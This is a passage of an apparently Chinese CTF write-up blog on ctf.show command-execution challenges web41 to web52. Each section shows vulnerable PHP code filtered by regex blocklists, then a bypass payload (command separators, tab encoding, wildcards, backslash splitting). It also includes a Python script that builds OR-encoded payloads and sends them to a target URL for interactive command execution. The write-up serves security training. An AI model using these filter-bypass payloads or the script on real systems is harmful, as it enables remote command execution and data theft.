src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web40/AKO6S7Q%24R_EJ%5B6Q13BEICQ9.png" alt=""></p><h3 id="web41"><a class="header-anchor" href="#web41">¬∂</a>web41</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ËøáÊª§‰∫ÜÊï∞Â≠óÂíåÂ≠óÊØçËøòÊúâ‰∏Ä‰∫õÂÖ∂‰ªñÁ¨¶Âè∑Ôºå‰ΩÜÊàë‰ª¨ÂèØ‰ª•Âà©Áî®ÊàñËøêÁÆóÁ¨¶ËøõË°åÊûÑÈÄ†payloadËøõË°åÂëΩ‰ª§ÊâßË°å<br>ÊÄùË∑ØÔºö</p><blockquote><p>ÈÄö‰øóËß£ÈáäÔºö<br>‰æãÂ¶ÇÊ∫êÁ†Å‰∏≠Á¶ÅÊ≠¢Êàë‰ª¨‰ΩøÁî®‰∫ÜÊï∞Â≠ó3Ôºå‰πüÂ∞±ÊòØasciiÁ†ÅÂÄº‰∏∫51ÔºåÊàë‰ª¨ÂèØ‰ª•‰ΩøÁî®ÊàñËøêÁÆóÁ¨¶Âú®Ê≤°ÊúâË¢´Á¶ÅÊ≠¢ÁöÑÂ≠óÁ¨¶‰∏≠ÊûÑÈÄ†Âá∫51Êù•ÔºåÊØîÂ¶Ç19Âíå32Ê≤°ÊúâË¢´Á¶ÅÊ≠¢ÔºåÊàë‰ª¨ËøõË°åÊàñËøêÁÆó19|32=51ÔºåÂ∞±ÂèØ‰ª•Ëé∑Âæó51Ëøô‰∏™asciiÁ†ÅÂÄºÔºå‰πüÂ∞±ÊòØÊàêÂäüÂæóÂà∞‰∫ÜÊï∞Â≠ó3</p></blockquote><p>Áü•ÈÅì‰∫ÜÊñπÊ≥ïÂêéÔºåÊàë‰ª¨‰ªéasciiÁ†ÅË°®Ôºå‰πüÂ∞±ÊòØ0-255‰∏≠ÊâæÂà∞Ê≤°ÊúâË¢´ËøáÊª§ÁöÑÂ≠óÁ¨¶ËøõË°åÊàñËøêÁÆóÔºå‰ª•ÂØªÊ±ÇÂæóÂà∞Êàë‰ª¨ÊÉ≥Ë¶ÅÁöÑÂ≠óÁ¨¶<br>ÁªìÂêà‰∫ÜyuÂ∏àÂÇÖÁªôÂá∫ÁöÑexpÔºåÊàë‰ª¨ÂÜô‰∏Ä‰∏™Áã¨Á´ãÁöÑpythonËÑöÊú¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/2/10 12:56</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">if</span>(len(argv)!=<span class="number">2</span>):</span><br><span class="line">    print(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">    print(<span class="string">&#x27;USER:python exp.py &lt;url&gt;&#x27;</span>)</span><br><span class="line">    print(<span class="string">&quot;eg:  python exp.py http://ctf.show/&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;exit: input exit in function&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line">url=argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#ÁîüÊàêÂèØÁî®ÁöÑÂ≠óÁ¨¶</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_rce</span>():</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    preg = <span class="string">&#x27;[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> (re.match(preg, chr(i), re.I) <span class="keyword">or</span> re.match(preg, chr(j), re.I)):</span><br><span class="line">                k = i | j</span><br><span class="line">                <span class="keyword">if</span> k &gt;= <span class="number">32</span> <span class="keyword">and</span> k &lt;= <span class="number">126</span>:</span><br><span class="line">                    a = <span class="string">&#x27;%&#x27;</span> + hex(i)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">                    b = <span class="string">&#x27;%&#x27;</span> + hex(j)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">                    result += (chr(k) + <span class="string">&#x27; &#x27;</span> + a + <span class="string">&#x27; &#x27;</span> + b + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    f = open(<span class="string">&#x27;rce.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    f.write(result)</span><br><span class="line">    </span><br><span class="line"><span class="comment">#Ê†πÊçÆËæìÂÖ•ÁöÑÂëΩ‰ª§Âú®ÁîüÊàêÁöÑtxt‰∏≠ËøõË°åÂåπÈÖç</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">action</span>(<span class="params">arg</span>):</span></span><br><span class="line">    s1=<span class="string">&quot;&quot;</span></span><br><span class="line">    s2=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        f=open(<span class="string">&quot;rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            t=f.readline()</span><br><span class="line">            <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">                s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        f.close()</span><br><span class="line">    output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span>(output)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    write_rce()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        s1 = input(<span class="string">&quot;\n[+] your functionÔºö&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> s1 == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        s2 = input(<span class="string">&quot;[+] your commandÔºö&quot;</span>)</span><br><span class="line">        param=action(s1) + action(s2)</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;c&#x27;</span>:urllib.parse.unquote(param)</span><br><span class="line">            &#125;</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        print(<span class="string">&quot;\n[*] result:\n&quot;</span>+r.text)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>ËøêË°åÂêéÔºåËæìÂÖ•ÂëΩ‰ª§ÂæóÂà∞flag<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web41/%7DG%40_KOG%24CK29%60OW%5BQEF%5DQMR.png" alt=""><br>ÂêéÊù•ÂèëÁé∞ÂõæÁâáËÑöÊú¨ÂêçÂ≠óÊâìÈîô‰∫ÜÔºåÊòØÊàñËøêÁÆóÂô¢Ôºå‰∏çË¶ÅÊ¶ÇÂøµÊ∑∑Ê∑Ü‰∫ÜÂìàÂìà</p><h3 id="web42"><a class="header-anchor" href="#web42">¬∂</a>web42</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ËøôÊ¨°ÂêéÈù¢Â§ö‰∫Ü‰∏Ä‰∏™&quot; &gt;/dev/null 2&gt;&amp;1&quot;ËØ≠Âè•ÔºåÊÑèÊÄùÊòØÂÜôÂÖ•ÁöÑÂÜÖÂÆπ‰ºöÊ∞∏ËøúÊ∂àÂ§±Ôºå‰πüÂ∞±ÊòØ‰∏çËøõË°åÂõûÊòæ</p><blockquote><p>1Ôºö&gt; ‰ª£Ë°®ÈáçÂÆöÂêëÂà∞Âì™ÈáåÔºå‰æãÂ¶ÇÔºöecho ‚Äú123‚Äù &gt; /home/123.txt<br>2Ôºö/dev/null ‰ª£Ë°®Á©∫ËÆæÂ§áÊñá‰ª∂<br>3Ôºö2&gt; Ë°®Á§∫stderrÊ†áÂáÜÈîôËØØ<br>4Ôºö&amp; Ë°®Á§∫Á≠âÂêå‰∫éÁöÑÊÑèÊÄùÔºå2&gt;&amp;1ÔºåË°®Á§∫2ÁöÑËæìÂá∫ÈáçÂÆöÂêëÁ≠âÂêå‰∫é1<br>5Ôºö1 Ë°®Á§∫stdoutÊ†áÂáÜËæìÂá∫ÔºåÁ≥ªÁªüÈªòËÆ§ÂÄºÊòØ1ÔºåÊâÄ‰ª•&quot;&gt;/dev/null&quot;Á≠âÂêå‰∫é ‚Äú1&gt;/dev/null‚Äù<br>Âõ†Ê≠§Ôºå&gt;/dev/null 2&gt;&amp;1 ‰πüÂèØ‰ª•ÂÜôÊàê‚Äú1&gt; /dev/null 2&gt; &amp;1‚Äù</p><p>ÈÇ£‰πàÊú¨ÊñáÊ†áÈ¢òÁöÑËØ≠Âè•ÊâßË°åËøáÁ®ã‰∏∫Ôºö<br>1&gt;/dev/null ÔºöÈ¶ñÂÖàË°®Á§∫Ê†áÂáÜËæìÂá∫ÈáçÂÆöÂêëÂà∞Á©∫ËÆæÂ§áÊñá‰ª∂Ôºå‰πüÂ∞±ÊòØ‰∏çËæìÂá∫‰ªª‰Ωï‰ø°ÊÅØÂà∞ÁªàÁ´ØÔºå‰πüÂ∞±ÊòØ‰∏çÊòæÁ§∫‰ªª‰Ωï‰ø°ÊÅØ„ÄÇ<br>2&gt;&amp;1 Ôºö Êé•ÁùÄÔºåÊ†áÂáÜÈîôËØØËæìÂá∫ÈáçÂÆöÂêëÂà∞Ê†áÂáÜËæìÂá∫ÔºåÂõ†‰∏∫‰πãÂâçÊ†áÂáÜËæìÂá∫Â∑≤ÁªèÈáçÂÆöÂêëÂà∞‰∫ÜÁ©∫ËÆæÂ§áÊñá‰ª∂ÔºåÊâÄ‰ª•Ê†áÂáÜÈîôËØØËæìÂá∫‰πüÈáçÂÆöÂêëÂà∞Á©∫ËÆæÂ§áÊñá‰ª∂„ÄÇ</p></blockquote><p>‰πüÂ∞±ÊòØÊàë‰ª¨Â¶ÇÊûúËæìÂÖ•<code>?c=ls</code>ÔºåËæìÂá∫Â∞±‰ºöË¢´ÂêûÊéâ‰∏çËøõË°åÂõûÊòæÔºåÈÇ£ËØ•ÊÄé‰πàÂäûÂë¢ÔºüÂÖ∂ÂÆûÂæàÁÆÄÂçïÔºåÁî®<code>;</code>Âè∑ÊàñËÄÖ<code>||</code>Á≠âÁ≠â‰∏Ä‰∫õÂëΩ‰ª§ÂàÜÈöîÁ¨¶ËøõË°åÂëΩ‰ª§ÂàÜÈöî<br>payloadÂ¶Ç‰∏ãÔºö</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;tac flag.php;</span><br></pre></td></tr></table></figure><h3 id="web43"><a class="header-anchor" href="#web43">¬∂</a>web43</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Âú®ÂâçÈù¢Âü∫Á°Ä‰∏äËøáÊª§‰∫ÜcatÂíå;Âè∑ÔºåÊàë‰ª¨‰ΩøÁî®ÂÖ∂‰ªñÂëΩ‰ª§ÂàÜÈöîÁ¨¶Âç≥ÂèØ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;tac flag.php||</span><br></pre></td></tr></table></figure><h3 id="web44"><a class="header-anchor" href="#web44">¬∂</a>web44</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">f(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/;|cat|flag/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÊääflagËøáÊª§‰∫ÜÔºåÁõ∏‰ø°Â¶ÇÊûú‰Ω†‰ªéÂâçÈù¢ÂÅöÂà∞Áé∞Âú®ÔºåÂøÉ‰∏≠Â∫îËØ•‰πüÁü•ÈÅìÊÄé‰πàÁªïËøá‰∫ÜÂìàÂìàÔºå‰ΩøÁî®ÈÄöÈÖçÁ¨¶ËøõË°åÁªïËøá</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;tac fla*||</span><br></pre></td></tr></table></figure><h3 id="web45"><a class="header-anchor" href="#web45">¬∂</a>web45</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| /i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ËøôÊ¨°ÊääÁ©∫Ê†º‰πüËøáÊª§‰∫ÜÔºåokÔºå‰ΩøÁî®%09ËøõË°åÁªïËøáÔºå%09ÊòØtabÁöÑurlÁºñÁ†Å</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;tac%09fla*||</span><br></pre></td></tr></table></figure><h3 id="web46"><a class="header-anchor" href="#web46">¬∂</a>web46</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ËøôÊ¨°ÊääÊï∞Â≠óÈÉΩËøáÊª§‰∫ÜÔºåËøòÊääÈÄöÈÖçÁ¨¶<code>*</code>ËøõË°å‰∫ÜËøáÊª§ÔºåÊàë‰ª¨ÂèØ‰ª•ÊîπÁî®<code>?</code>ËøõË°åÂåπÈÖçÔºåÂêåÊó∂Á©∫Ê†ºÁöÑËØùËøòÊòØÂèØ‰ª•ÁªßÁª≠‰ΩøÁî®%09ÔºåÂÆÉ‰∏çÂ±û‰∫éËøáÊª§ÁöÑÊï∞Â≠óËåÉÁï¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;tac%09fla?.php||</span><br></pre></td></tr></table></figure><h3 id="web47"><a class="header-anchor" href="#web47">¬∂</a>web47</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ËøôÊ¨°Â§öËøáÊª§‰∫ÜÂá†‰∏™ËØªÂèñÊñá‰ª∂ÁöÑÂëΩ‰ª§Ôºå‰ΩÜtacÊ≤°ÊúâË¢´ËøáÊª§Êàë‰ª¨ÁªßÁª≠‰ΩøÁî®‰πãÂâçÁöÑpayload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;tac%09fla?.php||</span><br></pre></td></tr></table></figure><p>ËøôÈáåË°•ÂÖÖ‰∏Ä‰∏ã‰∏Ä‰∫õÂÖ∂‰ªñÂëΩ‰ª§ËØªÂèñÁöÑÊìç‰Ωú</p><blockquote><p>more:‰∏ÄÈ°µ‰∏ÄÈ°µÁöÑÊòæÁ§∫Ê°£Ê°àÂÜÖÂÆπ<br>less:‰∏é more Á±ª‰ºº<br>head:Êü•ÁúãÂ§¥Âá†Ë°å<br>tac:‰ªéÊúÄÂêé‰∏ÄË°åÂºÄÂßãÊòæÁ§∫ÔºåÂèØ‰ª•ÁúãÂá∫ tac ÊòØ cat ÁöÑÂèçÂêëÊòæÁ§∫<br>tail:Êü•ÁúãÂ∞æÂá†Ë°å<br>nlÔºöÊòæÁ§∫ÁöÑÊó∂ÂÄôÔºåÈ°∫‰æøËæìÂá∫Ë°åÂè∑<br>od:‰ª•‰∫åËøõÂà∂ÁöÑÊñπÂºèËØªÂèñÊ°£Ê°àÂÜÖÂÆπ<br>vi:‰∏ÄÁßçÁºñËæëÂô®ÔºåËøô‰∏™‰πüÂèØ‰ª•Êü•Áúã<br>vim:‰∏ÄÁßçÁºñËæëÂô®ÔºåËøô‰∏™‰πüÂèØ‰ª•Êü•Áúã<br>sort:ÂèØ‰ª•Êü•Áúã<br>uniq:ÂèØ‰ª•Êü•Áúã<br>file -f:Êä•ÈîôÂá∫ÂÖ∑‰ΩìÂÜÖÂÆπ<br>grep<br>1„ÄÅÂú®ÂΩìÂâçÁõÆÂΩï‰∏≠ÔºåÊü•ÊâæÂêéÁºÄÊúâ file Â≠óÊ†∑ÁöÑÊñá‰ª∂‰∏≠ÂåÖÂê´ test Â≠óÁ¨¶‰∏≤ÁöÑÊñá‰ª∂ÔºåÂπ∂ÊâìÂç∞Âá∫ËØ•Â≠óÁ¨¶‰∏≤ÁöÑË°å„ÄÇÊ≠§Êó∂ÔºåÂèØ‰ª•‰ΩøÁî®Â¶Ç‰∏ãÂëΩ‰ª§Ôºö<br>grep test *file<br>strings</p></blockquote><h3 id="web48"><a class="header-anchor" href="#web48">¬∂</a>web48</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ËøôÊ¨°ËøòÊòØÂ§öËøáÊª§‰∫Ü‰∏Ä‰∫õËØªÂèñÁöÑÂëΩ‰ª§ÔºåtacÊ≤°ÊúâË¢´ËøáÊª§ÔºåÁªßÁª≠‰ΩøÁî®ÂâçÈù¢ÁöÑpayload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;tac%09fla?.php||</span><br></pre></td></tr></table></figure><h3 id="web49"><a class="header-anchor" href="#web49">¬∂</a>web49</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ËøòÊòØÊ≤°ÊúâËøáÊª§tacÔºåÁªßÁª≠‰ΩøÁî®ÂâçÈù¢ÁöÑpayload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;tac%09fla?.php||</span><br></pre></td></tr></table></figure><h3 id="web50"><a class="header-anchor" href="#web50">¬∂</a>web50</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ËøôÊ¨°Êää<code>%</code>ËøõË°å‰∫ÜËøáÊª§ÔºåÊàë‰ª¨‰ΩøÁî®&lt;&gt;Âè∑ËøõË°åÁªïËøáÔºåËøôÈáåÈÄöÈÖçÁ¨¶ËøõË°å‰øÆÊîπ‰∏Ä‰∏ãÔºå&lt;&gt;ÂíåÔºü‰∏ÄËµ∑Ê≤°ÊúâÊòæÁ§∫Âá∫Êù•ÔºåÊîπÁî®<code>\</code>ËøõË°åÁªïËøáÔºåpaylaodÂ¶Ç‰∏ã</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;tac&lt;&gt;fla\g.php||</span><br></pre></td></tr></table></figure><h3 id="web51"><a class="header-anchor" href="#web51">¬∂</a>web51</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ËøôÊ¨°ÂØπtacËøõË°å‰∫ÜËøáÊª§ÔºåÊàë‰ª¨ÂèØ‰ª•Áî®<code>\</code>ÂàÜÂâ≤ËøõË°åÁªïËøáÔºåpayloadÂ¶Ç‰∏ã</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;ta\c&lt;&gt;fla\g.php||</span><br></pre></td></tr></table></figure><h3 id="web52"><a class="header-anchor" href="#web52">¬∂</a>web52</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| 